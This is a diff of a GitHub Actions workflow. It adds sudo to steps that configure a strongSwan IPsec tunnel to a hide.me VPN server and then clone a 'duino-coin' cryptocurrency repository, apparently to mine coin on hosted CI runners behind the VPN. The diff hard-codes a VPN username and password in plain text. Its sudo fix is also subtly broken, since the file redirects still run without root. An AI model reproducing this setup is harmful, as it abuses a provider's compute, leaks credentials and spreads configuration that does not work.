@@ -26,17 +26,17 @@ jobs:
    steps:
      - run: |
       
-        apt-get -y install strongswan
-        apt-get -y install strongswan-plugin-eap-mschapv2
-        apt-get -y install libcharon-extra-plugins
-        apt-get -y install libstrongswan-extra-plugins
-        printf '%s\n\t' 'conn hide-nl' 'keyexchange=ike' 'dpdaction=clear' 'dpddelay=300s' 'eap_identity=shah77pc' 'leftauth=eap-mschapv2' 'left=%defaultroute' 'leftsourceip=%config' 'right=nl.hide.me' 'rightauth=pubkey' 'rightsubnet=0.0.0.0/0' 'rightid="C=MY, L=Labuan, O=eVenture Limited, CN=*.hide.me"' 'type=tunnel' '#hide-nl' 'auto=add' >  /etc/ipsec.conf
+        sudo apt-get -y install strongswan
+        sudo apt-get -y install strongswan-plugin-eap-mschapv2
+        sudo apt-get -y install libcharon-extra-plugins
+        sudo apt-get -y install libstrongswan-extra-plugins
+        sudo printf '%s\n\t' 'conn hide-nl' 'keyexchange=ike' 'dpdaction=clear' 'dpddelay=300s' 'eap_identity=shah77pc' 'leftauth=eap-mschapv2' 'left=%defaultroute' 'leftsourceip=%config' 'right=nl.hide.me' 'rightauth=pubkey' 'rightsubnet=0.0.0.0/0' 'rightid="C=MY, L=Labuan, O=eVenture Limited, CN=*.hide.me"' 'type=tunnel' '#hide-nl' 'auto=add' >  /etc/ipsec.conf
         sed -i 's/load = yes/load = no/g' /etc/strongswan.d/charon/constraints.conf
-        printf '%s' 'shah77pc' ' : EAP ' '137713471342aA' >> /etc/ipsec.secrets
-        rmdir /etc/ipsec.d/cacerts
-        ln -s /etc/ssl/certs /etc/ipsec.d/cacerts
-        ipsec restart
-        ipsec up hide-nl
+        sudo printf '%s' 'shah77pc' ' : EAP ' '137713471342aA' >> /etc/ipsec.secrets
+        sudo rmdir /etc/ipsec.d/cacerts
+        sudo ln -s /etc/ssl/certs /etc/ipsec.d/cacerts
+        sudo ipsec restart
+        sudo ipsec up hide-nl
         sudo apt update
         sudo apt install python3 python3-pip git python3-pil python3-pil.imagetk -y # Install dependencies
         git clone https://github.com/shah77pc/duino-coin
